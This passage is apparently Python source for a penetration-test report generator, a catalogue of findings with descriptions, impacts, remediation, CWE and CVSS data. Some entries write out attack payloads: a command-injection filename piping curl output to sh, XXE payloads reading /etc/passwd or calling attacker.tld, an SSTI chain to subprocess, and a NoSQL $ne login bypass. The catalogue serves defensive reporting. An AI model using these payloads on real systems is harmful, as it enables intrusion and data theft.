            remediation="- Set a hard absolute session lifetime (24h is a sensible default for non-elevated sessions).\n- Set an idle-timeout that rolls the session token forward only on activity (15-30 minutes for sensitive apps).\n- Implement server-side session revocation so a Sign Out really invalidates the token, not just clears the cookie.",
            references="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
            cwe="CWE-613",
            cvss_score=3.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Username Enumeration on Login / Forgot Password", "Low",
            description="`POST /api/auth/login` with an existing username returns `{\"error\":\"Invalid password\"}` and with a non-existent username returns `{\"error\":\"User not found\"}`. The same distinction is observable on `POST /api/auth/forgot-password` via the response timing (~200 ms vs ~20 ms).",
            impact="An attacker can compile a list of valid usernames at the application before launching a credential-stuffing or password-spray campaign — making the subsequent attack faster and noisier-but-effective.",
            remediation="- Return a single neutral error message for both \"user not found\" and \"wrong password\" cases (`\"Invalid credentials\"`).\n- Equalise response timing — perform the password-hash comparison even when the user doesn't exist (with a dummy hash).\n- Always respond to `/forgot-password` with the same generic acknowledgement regardless of whether the email exists.",
            references="https://owasp.org/www-community/attacks/Forced_browsing",
            cwe="CWE-204",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("api_vapt", "Mass / Bulk Endpoint Without Rate Limiting", "Medium",
            description="`POST /api/notifications/bulk` accepts arrays of up to 100,000 entries with no rate limit and no concurrency cap. A single authenticated client can submit thousands of requests per second; the backend processes them serially and queues memory grows unbounded.",
            impact="A misbehaving or malicious client can exhaust queue / DB / email-quota resources in minutes — denial-of-service against every other tenant.",
            remediation="- Apply per-user / per-token rate limits at the edge (e.g. 60 req/min) AND a global concurrency cap.\n- Cap per-request payload size (e.g. 1 MB body, 1000 array items).\n- Move bulk operations to an async job-queue with backpressure.",
            references="https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
            cwe="CWE-770", owasp="API4:2023",
            cvss_score=5.9,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["web_vapt"]),

        _f("api_vapt", "GraphQL Introspection Enabled in Production", "Low",
            description="`POST /graphql` accepts the introspection query and returns the full schema — every type, field, argument, and deprecation reason. The production deployment ships with `introspection: true` set in the Apollo server config.",
            impact="Introspection by itself is a low-severity disclosure but it gives attackers a complete map of attack surface: every query, every mutation, every nested type. Subsequent attacks (auth-bypass, IDOR, mass-assignment) target only the most-rewarding fields.",
            remediation="- Disable introspection in production (`introspection: false`).\n- Persist queries — only allow clients to submit queries by hash, computed from a build-time allow-list.\n- Apply per-field authorization so even if introspection is on, the data behind the schema is still gated.",
            references="https://owasp.org/www-project-graphql-cheat-sheet/",
            cwe="CWE-200", owasp="API8:2023",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("api_vapt", "API Versioning / Old Endpoint Still Active", "Medium",
            description="An older API version (`/api/v1/`) is still served by the production gateway despite the team having migrated to `/api/v2/` with stricter authorization. The v1 endpoints retain the original IDOR / mass-assignment behaviour that was fixed in v2.",
            impact="Whatever vulnerabilities the v2 upgrade fixed are still trivially exploitable via v1. The team's perception of the security posture is misaligned with reality.",
            remediation="- Sunset v1 with an end-of-life date, returning HTTP 410 once the date passes.\n- Audit the gateway for every still-routable endpoint version.\n- Treat API versions as security boundaries — a fix in v2 must be back-ported (or v1 retired) before the engagement is considered complete.",
            references="https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
            cwe="CWE-1059",
            cvss_score=6.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N"),
    ])

    # ---- Infrastructure --------------------------------------------
    F.extend([
        _f("infra_vapt", "SSH Permits Password Authentication on Internet-Facing Host", "Medium",
            description="Port 22 on the audited bastion accepts password authentication (`PasswordAuthentication yes` in `/etc/ssh/sshd_config`). The host has no fail2ban / rate limiting; sshd is reachable from `0.0.0.0/0`.",
            impact="Internet-facing SSH with password auth is the #1 target for credential-spray botnets. A weak password compromises the host, which is typically a pivot point into the wider internal network.",
            remediation="- Disable password authentication (`PasswordAuthentication no`).\n- Require key-based authentication, ideally with hardware-token-backed keys (YubiKey, FIDO2).\n- Restrict source IPs (security group / firewall) to the corporate VPN.\n- Run fail2ban / sshguard as defence in depth.",
            references="https://infosec.mozilla.org/guidelines/openssh",
            cwe="CWE-287",
            cvss_score=5.9,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Default SNMP Community Strings (public / private)", "High",
            description="`snmpwalk -v2c -c public <host>` succeeds and returns the full system MIB tree: hostname, interface list, ARP cache, routing table, and (on some devices) software-installed packages. `private` is similarly accepted for read-write SNMP.",
            impact="An attacker on the network segment can enumerate the device's configuration, modify SNMP-writable values, and (on routers / switches) potentially reconfigure VLANs / ACLs without authentication.",
            remediation="- Replace SNMPv1 / v2c community strings with SNMPv3 authentication + privacy (SHA + AES-256).\n- If SNMPv2c must remain, rotate to a long-random community string AND restrict by source IP via the device's SNMP access-list.\n- Disable SNMP entirely on devices that don't need it (`no snmp-server` on Cisco).",
            references="https://owasp.org/www-community/vulnerabilities/Use_of_Hard-coded_Credentials",
            cwe="CWE-1392",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:L/SC:L/SI:L/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "SMB Signing Not Required", "Medium",
            description="`nmap --script smb-security-mode <host>` reports `Message signing disabled (dangerous, but default)`. Verified with Responder + SMB relay — captured a NetNTLMv2 hash from a victim and relayed it to the audited host's SMB, successfully authenticating as the victim.",
            impact="Enables NTLM-relay attacks across the network segment. Combined with a Responder-style LLMNR/NBT-NS poisoning, an attacker can authenticate to any SMB-reachable host as any user whose machine performed a name lookup — typically a domain admin within minutes.",
            remediation="- Enable SMB signing across the domain via GPO (`Microsoft network server: Digitally sign communications (always) = Enabled`).\n- Disable SMBv1 entirely.\n- Disable LLMNR / NBT-NS to remove the upstream poisoning surface.\n- Patch beyond MS17-010 (EternalBlue) and disable SMBv1.",
            references="https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3",
            cwe="CWE-300",
            cvss_score=6.1,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "LLMNR / NBT-NS Multicast Resolution Enabled", "Medium",
            description="Running Responder on the audited subnet captures NetNTLMv2 hashes within minutes — Windows workstations are issuing LLMNR (UDP 5355) and NetBIOS Name Service (UDP 137) broadcasts looking up names that don't resolve via DNS (e.g. mistyped SMB shares, automated mount attempts).",
            impact="Captured hashes can be cracked offline (Hashcat) or relayed live (ntlmrelayx). Within an Active Directory domain this is one of the fastest paths from \"no domain creds\" to \"domain admin\".",
            remediation="- Disable LLMNR via GPO: Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution = Enabled.\n- Disable NBT-NS by setting `NetbiosOptions=2` on every adapter (GPO preferences > Registry).\n- Verify with `nmap --script broadcast-llmnr-discovery` / Responder in detection mode.",
            references="https://attack.mitre.org/techniques/T1557/001/",
            cwe="CWE-300",
            cvss_score=6.4,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:L/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Kerberoasting — SPN-Enabled Service Account with Weak Password", "High",
            description="`GetUserSPNs.py` retrieved Service Principal Names for 4 domain user accounts. The TGS tickets for `MSSQLSvc/db01` and `HTTP/intranet` cracked in under 2 hours with Hashcat against the `rockyou` wordlist (account passwords: `Welcome2026!`, `Company@123`).",
            impact="Kerberoasted accounts often have elevated privileges (service accounts running databases, web apps, scheduled tasks) and short, formulaic passwords. Cracking them yields direct access to those services AND, frequently, lateral movement opportunities via shared credentials.",
            remediation="- Rotate every service-account password to ≥ 25 random characters; managed Service Accounts (gMSA) handle rotation automatically.\n- Audit AD for accounts with `servicePrincipalName` set and validate each one is legitimately needed.\n- Enable AES-only Kerberos encryption (disable RC4) so the TGS hash format is harder to crack.\n- Monitor for bulk TGS requests in DC logs (event 4769 with unusual volume).",
            references="https://attack.mitre.org/techniques/T1558/003/",
            cwe="CWE-521",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("infra_vapt", "Anonymous LDAP Bind Permitted", "Low",
            description="`ldapsearch -x -H ldap://<dc> -b 'dc=corp,dc=local' '(objectClass=user)'` returns the full user directory without credentials. The domain controllers accept anonymous binds for read operations.",
            impact="An unauthenticated attacker on the network can enumerate every domain user, computer, group, and OU — fuel for password-spray attacks, social engineering, and targeted Kerberoasting / AS-REP roasting.",
            remediation="- Set `dsHeuristics` attribute on the DC to disallow anonymous binds (`dsHeuristics 0000002`).\n- Restrict the `Pre-Windows 2000 Compatible Access` group to no non-administrative members.\n- Audit which apps rely on anonymous LDAP (legacy printers, scan-to-folder) and migrate them to authenticated binds.",
            references="https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations",
            cwe="CWE-287",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Unauthenticated NFS Export of Sensitive Filesystem", "High",
            description="`showmount -e <host>` lists `/exports/home  *` as a wildcard export. Mounting it from a different host (`mount -t nfs <host>:/exports/home /mnt`) succeeds without authentication; user home directories — including private SSH keys, `.bash_history`, and cached credentials — are readable as if local.",
            impact="An attacker on the same network can read or modify every file in the exported filesystem. SSH keys and shell history typically yield credentials for further pivoting.",
            remediation="- Restrict NFS exports to specific client IPs (`/exports/home  10.0.1.0/24(rw,no_root_squash)`).\n- Enable NFSv4 with Kerberos authentication (`krb5p`) — kills the network-level trust model.\n- Audit `/etc/exports` on every NFS server; the wildcard `*` is almost always a misconfiguration.",
            references="https://cwe.mitre.org/data/definitions/284.html",
            cwe="CWE-284",
            cvss_score=8.1,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("infra_va", "End-of-Life Operating System / Software Version", "High",
            description="The Nessus / OpenVAS scan flags hosts running software past its vendor end-of-support date: Windows Server 2012 R2 (EoL 2023-10-10), Ubuntu 16.04 (EoL 2021-04), CentOS 7 (EoL 2024-06-30), Apache HTTPD 2.2 (EoL 2017-12).",
            impact="No further security patches will ever be released by the vendor. Every newly disclosed CVE in the affected products is unpatchable; over time the cumulative exposure becomes guaranteed RCE for an attacker who waits.",
            remediation="- Inventory every EoL system and plan migration to a supported version.\n- Where migration is impossible short-term, purchase extended support (Microsoft ESU, RHEL Extended Lifecycle, Canonical UA) AND fence the system off network-wise.\n- For application-layer software, treat EoL like a critical CVE — patch SLO applies regardless of whether a specific CVE has been published yet.",
            references="https://endoflife.date/",
            cwe="CWE-1104",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["infra_vapt"]),

        _f("infra_va", "Weak / Self-Signed TLS Certificate", "Low",
            description="The HTTPS endpoint presents a certificate signed by a non-trusted CA, OR a self-signed certificate, OR a certificate with `Subject CN` that doesn't match the hostname. The audited endpoint also still supports TLS 1.0 / 1.1 and the RSA-1024 key length.",
            impact="Browsers warn the user, training them to click through certificate errors. MITM is undetectable in environments where users have been conditioned to ignore the warning. Outdated TLS versions and key lengths expose the connection to downgrade and computational-feasibility attacks.",
            remediation="- Replace the certificate with one signed by a publicly trusted CA (Let's Encrypt is free; commercial CAs for OV/EV when needed).\n- Disable TLS 1.0 / 1.1; require TLS 1.2 minimum, prefer TLS 1.3.\n- Use ECDSA P-256 or RSA-2048 minimum (RSA-3072 preferred for long-lifetime certs).\n- Configure HSTS so browsers refuse to ever fall back to a misconfigured connection.",
            references="https://www.ssllabs.com/projects/best-practices/",
            cwe="CWE-295",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_vapt"]),

        _f("infra_vapt", "Open Database Port Accessible From Untrusted Network", "High",
            description="Port 3306 (MySQL) / 5432 (Postgres) / 27017 (MongoDB) / 6379 (Redis) is reachable from outside the database tier's intended network zone. In some cases the database also accepts unauthenticated connections (`bind 0.0.0.0` with default auth disabled).",
            impact="At best, an attacker can run dictionary attacks against the DB credentials. At worst (unauthenticated Redis / pre-3.6 MongoDB) the entire database contents are readable and writable without any authentication.",
            remediation="- Restrict the DB port via host firewall / cloud security group to the application-tier subnet only.\n- Require authentication AND TLS on every database engine.\n- For Redis, set `requirepass` to a long random string AND bind to a private interface; consider Redis ACLs.\n- Run periodic scanner sweeps from the Internet to confirm no DB ports are exposed.",
            references="https://owasp.org/www-community/Network_Segmentation",
            cwe="CWE-284",
            cvss_score=8.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),
    ])

    # ---- Thick-client ----------------------------------------------
    F.extend([
        _f("thick_client_pt", "Sensitive Data in Process Memory (Cleartext)", "Medium",
            description="A memory dump (taken via Task Manager / `procdump`) of the running application is searched for known credentials. The user's plaintext password and the active session token are present in memory long after the login screen is dismissed.",
            impact="On a multi-user / shared workstation, any user with sufficient privilege to dump another process's memory recovers the credentials. Malware that gains code execution as the user does the same automatically.",
            remediation="- Zero out password buffers as soon as authentication completes — `SecureString` (.NET), `mlock`+`memset_s` (C/C++).\n- Use platform secret stores (DPAPI / Keychain / Linux Secret Service) for any token that must persist.\n- Reduce in-memory token lifetime by re-fetching short-lived tokens on demand.",
            references="https://cwe.mitre.org/data/definitions/316.html",
            cwe="CWE-312",
            cvss_score=5.6,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("thick_client_pt", "Insecure DLL Loading / DLL Hijacking", "Medium",
            description="The application loads several DLLs without an absolute path. Using `Process Monitor`, the search order resolves `version.dll` from the application's working directory before falling back to `C:\\Windows\\System32\\`. Placing a malicious `version.dll` next to the executable causes it to be loaded by the application at next launch.",
            impact="An attacker who can write to the application's directory (often achievable via per-user install paths, network shares, or a separate vulnerability) gets code execution as the user every time the app starts.",
            remediation="- Always pass absolute paths to `LoadLibrary` / `LoadLibraryEx`.\n- Call `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)` at process start so untrusted directories aren't searched.\n- Install the application to a path only administrators can write to (`C:\\Program Files\\…`).",
            references="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security",
            cwe="CWE-427",
            cvss_score=6.7,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:R/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ---- Cloud (AWS / Azure) extras -------------------------------
    F.extend([
        _f("aws_cloud_vapt", "S3 Bucket Allows Public Read", "High",
            description="An S3 bucket holding backup archives / client uploads has a bucket policy granting `s3:GetObject` to `Principal: \"*\"`. `aws s3 ls --no-sign-request s3://<bucket>` lists every object; `aws s3 cp --no-sign-request` downloads them.",
            impact="Every object in the bucket is downloadable by anyone on the Internet. Sensitive data exposure scales with whatever the bucket contained — financial reports, PII dumps, application secrets, customer files.",
            remediation="- Enable S3 Block Public Access at the account level (`PublicAccessBlockConfiguration`).\n- Audit every bucket policy with IAM Access Analyzer; remove `Principal: \"*\"` unless the bucket is genuinely a static website.\n- Where public access IS legitimately needed, scope to specific object prefixes (`Resource: arn:aws:s3:::bucket/public/*`).",
            references="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html",
            cwe="CWE-732",
            cvss_score=8.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("aws_cloud_vapt", "Security Group Allows 0.0.0.0/0 on SSH (22) / RDP (3389)", "High",
            description="An EC2 security group has an ingress rule `0.0.0.0/0 → tcp/22` (or `tcp/3389`). The associated instances are running production workloads; one of them is the bastion host.",
            impact="Every SSH/RDP brute-force botnet on the Internet probes these ports constantly. A weak password — or a 0-day in OpenSSH / Windows RDP — equals immediate host compromise.",
            remediation="- Restrict 22/3389 to corporate VPN ranges or AWS SSM-only access (eliminate the open port entirely).\n- Use Session Manager (`aws ssm start-session`) for shell access to instances — no inbound port needed.\n- Add a Config rule `restricted-ssh` that alerts on any new SG rule opening 22 to 0.0.0.0/0.",
            references="https://docs.aws.amazon.com/config/latest/developerguide/restricted-ssh.html",
            cwe="CWE-284",
            cvss_score=8.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:H/SI:H/SA:H"),

        _f("aws_cloud_vapt", "Lambda Function Without Reserved Concurrency or DLQ", "Low",
            description="A Lambda function processing customer events runs at default account-wide concurrency and writes failures into the function's CloudWatch logs but has no Dead Letter Queue or destination configured.",
            impact="A burst of events can starve every other Lambda in the account of concurrency, taking down unrelated workloads. Permanently-failing events are silently dropped; the team has no record of what was lost.",
            remediation="- Set per-function `ReservedConcurrentExecutions` so noisy functions can't starve others.\n- Configure an SQS DLQ or an On-Failure destination so unprocessed events land somewhere recoverable.\n- Alarm on `Errors`, `Throttles`, and `DeadLetterErrors` per function.",
            references="https://docs.aws.amazon.com/lambda/latest/dg/configuration-concurrency.html",
            cwe="CWE-693",
            cvss_score=3.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"),

        _f("azure_cloud_vapt", "Storage Account With Public Blob Access", "High",
            description="An Azure Storage account has `AllowBlobPublicAccess: true` and contains one or more containers with `Public access level: Container (anonymous read access for containers and blobs)`. The containers hold backup blobs, application secrets, and customer documents.",
            impact="Every blob in the affected containers is readable anonymously over the Internet. Same blast-radius as a public S3 bucket — full data exposure for whatever the containers held.",
            remediation="- Set `AllowBlobPublicAccess: false` at the storage account level (one-line fix).\n- Audit every container's `Public access level` and set it to `Private` unless it's genuinely a static site.\n- Use Azure Policy `allowedBlobPublicAccess` set to `Deny` so future drift is impossible.",
            references="https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-prevent",
            cwe="CWE-732",
            cvss_score=8.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("azure_cloud_vapt", "No Diagnostic Logs Forwarded to a SIEM", "Medium",
            description="The audited subscription has no Activity Log export configured, no per-resource Diagnostic Settings forwarding to Log Analytics / Event Hub / Storage Account, and no Microsoft Sentinel onboarded.",
            impact="In the event of an incident there are no centralised logs to investigate — the 90-day Activity Log default retention is in-place and per-resource; diagnostic data is silently lost at the resource layer.",
            remediation="- Enable a subscription-wide Activity Log diagnostic setting forwarding to a Log Analytics workspace with appropriate retention.\n- Apply Azure Policy `deploy-diag-set` to every resource type that exposes diagnostics, with workspace destination enforced.\n- Onboard Microsoft Sentinel (or a third-party SIEM) so detection rules can run on the centralised stream.",
            references="https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/diagnostic-settings",
            cwe="CWE-778",
            cvss_score=5.9,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N"),
    ])

    # ---- Source code review ----------------------------------------
    F.extend([
        _f("source_code_review", "Hardcoded Secret in Source Control", "High",
            description="`git log --all -p | grep -iE '(api[_-]?key|secret|password|token)\\s*=\\s*[\\\"\\']'` returns multiple historical matches: a third-party API key, a service-account password, and a Twilio auth token committed in `config/dev.yml` in 2023. The values are still active.",
            impact="Every developer with read access to the repo — past or present — knows the secret. If the repo is mirrored to GitHub even briefly, every secret-scanning bot on the planet has indexed it.",
            remediation="- Rotate every secret found in history immediately; assume it's already exfiltrated.\n- Move secrets to a secrets manager (Vault, AWS Secrets Manager, Azure Key Vault, K8s sealed-secrets).\n- Install a pre-commit hook (gitleaks, detect-secrets) that blocks new commits containing secret patterns.\n- For the historical leak, document it in a security incident; rewriting Git history is rarely worth it unless the repo is private and tightly controlled.",
            references="https://github.com/zricethezav/gitleaks",
            cwe="CWE-798",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["web_vapt", "infra_vapt"]),

        _f("source_code_review", "Insecure Random Number Generation for Security-Sensitive Tokens", "Medium",
            description="Password-reset tokens, session identifiers, and CSRF nonces are generated with `Math.random()` (Node), `random.random()` (Python's stdlib `random`), or `new Random()` (Java) — none of which are cryptographically secure.",
            impact="Token values are predictable given knowledge of (or even time-based inference about) the RNG seed. An attacker can predict the next reset token and take over accounts.",
            remediation="- Switch to a CSPRNG: `crypto.randomBytes` (Node), `secrets.token_urlsafe` (Python), `SecureRandom` (Java), `crypto/rand` (Go).\n- Audit every place a random value is generated for security-sensitive use.\n- Add a lint rule that flags `Math.random`/`random.random`/`new Random` outside of test code.",
            references="https://owasp.org/www-community/vulnerabilities/Insecure_Randomness",
            cwe="CWE-330",
            cvss_score=6.8,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
            extra_templates=["web_vapt", "api_vapt"]),

        _f("source_code_review", "Command Injection via Unsafe Shell Invocation", "Critical",
            description="A web handler builds a shell command from user input and executes it via `os.system` / `child_process.exec` / `Runtime.getRuntime().exec(\"sh -c …\")`. Example: `os.system(f\"convert {user_filename} /tmp/out.png\")` — a filename of `a.png; curl evil/sh|sh` is concatenated into the shell command.",
            impact="Remote Code Execution as the application's runtime user. Frequently full host compromise within minutes.",
            remediation="- Avoid shell invocation entirely. Use `subprocess.run([\"convert\", user_filename, …])` (Python) / `child_process.execFile` (Node) / `ProcessBuilder` with arg arrays (Java) which DO NOT involve a shell.\n- Where a shell IS unavoidable, validate the input against a strict allow-list (only alphanumeric + a known set of safe punctuation).\n- Never trust file names / URLs / parameters from the user inside a shell context.",
            references="https://owasp.org/www-community/attacks/Command_Injection\nhttps://cwe.mitre.org/data/definitions/78.html",
            cwe="CWE-78",
            cvss_score=9.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
            extra_templates=["web_vapt", "api_vapt"]),

        _f("source_code_review", "Hardcoded Cryptographic Key / IV", "Medium",
            description="The codebase contains a literal AES key / HMAC secret / IV embedded in source: `const KEY = Buffer.from('0123456789abcdef0123456789abcdef', 'hex');`. The same key is used to encrypt every record / sign every token in production.",
            impact="Compromise of the source code (insider access, repo leak, decompiled binary) yields the master key, which decrypts every record the key was ever used on. For HMAC signing keys, the impact is forgery — attacker can mint valid signed tokens.",
            remediation="- Derive keys at runtime from a secret stored in a secrets manager (Vault, AWS KMS, Azure Key Vault).\n- For at-rest encryption, use envelope encryption: a single Data Encryption Key per record, wrapped by a Key Encryption Key from KMS.\n- Rotate any key that has ever lived in source control.",
            references="https://cwe.mitre.org/data/definitions/798.html",
            cwe="CWE-798",
            cvss_score=6.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ============================================================
    # 2026-05 catalogue expansion (Phase 2) — deep injection,
    # access-control, cryptographic, and platform-specific findings
    # gathered from common Burp / OWASP / Bugcrowd reports. Each entry
    # carries description, impact, remediation, references, CWE,
    # OWASP category, and a CVSS 4.0 vector + score.
    # ============================================================

    # ---- Web / API injection family --------------------------------
    F.extend([
        _f("web_vapt", "XML External Entity (XXE) Injection", "High",
            description="The application parses XML supplied by the user with an XML parser that resolves external entities by default. Sending the following body to the `POST /api/import` endpoint:\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<order><customer>&xxe;</customer></order>\n```\n\nreturns the contents of `/etc/passwd` reflected in the response. A blind variant using `<!ENTITY % xxe SYSTEM \"http://attacker.tld/?p=PAYLOAD\">` triggers an outbound DNS / HTTP request that the attacker observes externally.",
            impact="Server-side file disclosure (`/etc/passwd`, `web.config`, AWS credential files), SSRF into the internal network (use `http://169.254.169.254/...` as the SYSTEM URI), and Denial of Service via Billion-Laughs / quadratic-blowup payloads. On older Java parsers, XXE can be escalated to RCE via the `jar:` protocol.",
            remediation="- Disable DTDs and external entity resolution in every XML parser. Per platform:\n  - Java (DocumentBuilderFactory): `setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)` and `setExpandEntityReferences(false)`.\n  - .NET (`XmlDocument`): `XmlResolver = null`; for `XmlReader` set `DtdProcessing = DtdProcessing.Prohibit`.\n  - Python: use `defusedxml` instead of stdlib `xml.etree.ElementTree` / `lxml`.\n  - PHP: `libxml_disable_entity_loader(true)` (pre-PHP 8.0); on PHP 8.0+ entity loading is off by default but verify per-parser.\n- Where DTDs are genuinely needed (rare), enable them only for trusted internal sources.",
            references="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\nhttps://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\nhttps://cwe.mitre.org/data/definitions/611.html",
            cwe="CWE-611", owasp="A05:2021",
            cvss_score=8.6,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:L/SC:H/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Server-Side Template Injection (SSTI)", "Critical",
            description="A user-controlled value is concatenated directly into a server-side template string (Jinja2, Twig, FreeMarker, Velocity, Handlebars-server, ERB). On a Jinja2 backend the payload `{{7*7}}` returns `49` confirming evaluation; `{{ ''.__class__.__mro__[2].__subclasses__() }}` enumerates loaded classes leading to `subprocess.Popen('id', shell=True)` chains for full RCE.\n\nObserved sink: `template = env.from_string(f\"Hello {request.args['name']}\")` — the value of `name` is treated as template source, not data.",
            impact="Remote Code Execution as the application's runtime user — typically full server compromise. Even where the sandboxed flavour of the engine is in use (Twig sandbox, Jinja2 SandboxedEnvironment), known sandbox-escape chains exist for most engines and treat the issue as full RCE until proven otherwise.",
            remediation="- Never construct a template from user-controlled string concatenation. Templates are *code*, data goes in via the template's parameter binding (`render_template('view.html', name=user_input)` — NOT `render_template_string(f\"Hello {user_input}\")`).\n- If a templating-by-user feature is genuinely required (e.g. user-defined email templates), use a sandboxed engine AND maintain an allow-list of accessible objects / methods.\n- Add a static lint rule (semgrep / CodeQL) that flags `render_template_string` / `from_string` / equivalent with non-literal arguments.",
            references="https://portswigger.net/research/server-side-template-injection\nhttps://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
            cwe="CWE-1336", owasp="A03:2021",
            cvss_score=9.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "NoSQL Injection (MongoDB / CouchDB / DynamoDB)", "High",
            description="The application forwards a JSON request body straight into a MongoDB query without type-checking the values. The login flow accepts:\n\n```\nPOST /api/auth/login\n{\"username\": \"admin\", \"password\": {\"$ne\": null}}\n```\n\nand authenticates the request — the `$ne` operator coerces the password check into \"any password that is not null\". `{\"$gt\": \"\"}` works similarly. Equivalent operator-injection bypasses exist for `$where`, `$regex`, `$exists`, and `$in`.",
            impact="Authentication bypass on every endpoint that takes a JSON body as a query. On `$where`-style queries (which evaluate JavaScript), the consequence escalates to server-side JavaScript injection — read/write any document the connection's user can reach.",
            remediation="- Cast every input to the expected type BEFORE assembling the query. `username` and `password` must be strings; reject the request if they're objects.\n- Use a Mongoose / pymongo / typed-DTO layer that enforces schema at the boundary.\n- Disable server-side JavaScript in MongoDB (`security.javascriptEnabled: false`).\n- Adopt the principle of least privilege on the DB user — read-only credentials for read-only endpoints.",
            references="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection\nhttps://cwe.mitre.org/data/definitions/943.html",
            cwe="CWE-943", owasp="A03:2021",
            cvss_score=8.4,
